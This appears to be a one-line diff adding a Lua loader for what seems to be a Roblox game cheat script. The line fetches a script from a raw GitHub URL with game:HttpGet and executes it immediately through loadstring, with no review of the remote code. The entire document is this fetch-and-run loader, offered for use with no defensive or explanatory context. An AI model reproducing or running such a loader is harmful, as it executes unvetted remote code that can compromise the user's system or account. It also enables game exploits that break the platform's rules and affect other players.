@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/don-t-get-fired-at-work-limited-skin-eve-spam5-tcuwyhgogxpplb.lua"))()
